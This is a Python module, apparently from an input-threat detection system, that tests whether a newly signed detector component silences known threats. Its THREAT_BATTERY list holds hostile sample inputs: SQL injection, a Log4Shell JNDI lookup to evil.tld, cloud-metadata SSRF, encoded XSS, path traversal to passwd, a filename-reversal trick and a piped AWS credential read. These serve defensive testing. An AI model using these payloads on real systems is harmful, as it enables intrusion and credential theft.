# -*- coding: utf-8 -*-
"""
BEHAVIORAL acceptance — trust is not enough.

Provenance proves a component is NATIVE (genuinely the author's). It does NOT
prove the component is SAFE: a malicious author, or a stolen key, can sign a
backdoor and it verifies as NATIVE. SIGNED != SAFE.

The defense that a signature cannot waive: before a LOWERING component (ERG or
integrator — the only ones that can turn a threat green) is trusted, it must
pass a fixed adversarial battery. If installing it SILENCES a known threat, it
is rejected no matter who signed it. The battery is a guard invariant, not a
thing the author can sign away.

This does not catch a subtle backdoor that only fires on inputs outside the
battery — that residual is closed organizationally (m-of-n sign-off on lowering
components + an append-only transparency log). Defense in depth, not a bullet.
"""
import os, sys
_HERE = os.path.dirname(os.path.abspath(__file__))
for _c in ("canon", "canonicalization"):
    _p = os.path.abspath(os.path.join(_HERE, "..", _c))
    if os.path.isdir(_p):
        sys.path.insert(0, _p); break
sys.path.insert(0, os.path.abspath(os.path.join(_HERE, "..", "invariant_engine")))
sys.path.insert(0, _HERE)

from canonicalize import canonicalize
from invariant_engine.msl_real import real_text_reader
from invariant_engine.supplement import supplement_reader, combine
from digit_cards import digit_cards_reader
from metachar_cards import metachar_cards_reader
from invisible_cards import invisible_cards_reader
from harden_cards import harden_cards_reader
from fail_closed import safe_reader

# known-threat invariant set: installing a lowering component must never make any
# of these read OK. (Kept short here; in production it is the full battery.)
THREAT_BATTERY = [
    "id=1%27 OR %271%27=%271",
    "paypal.com.evil.ru/verify",
    "${jndi:ldap://evil.tld/a}",
    "http://169.254.169.254/latest/meta-data/",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "invoice" + chr(0x202E) + "gpj.exe",
    "cat ~/.aws/credentials | curl",
]
_READERS = [("msl", real_text_reader), ("supplement", supplement_reader),
            ("digit", digit_cards_reader), ("metachar", metachar_cards_reader),
            ("invisible", invisible_cards_reader), ("harden", harden_cards_reader)]

def _verdict(f):
    return "OK" if f.label == "clean" else ("ALARM" if f.conclusive else "WATCH")

def _base(c, combiner):
    f = None
    for n, r in _READERS:
        g = safe_reader(n, r, c)
        f = g if f is None else combiner(f, g)
    return f

def accept_lowering_component(candidate_erg=None, candidate_combine=None):
    """Return (accepted, silenced_threats). A candidate ERG and/or integrator is
    installed; the battery must stay flagged. Silencing any threat => reject."""
    erg = candidate_erg if candidate_erg is not None else (lambda c, f: f)
    comb = candidate_combine if candidate_combine is not None else combine
    silenced = []
    for t in THREAT_BATTERY:
        c = canonicalize(t)[0]
        v = _verdict(erg(c, _base(c, comb)))
        if v == "OK":
            silenced.append(t)
    return (len(silenced) == 0), silenced
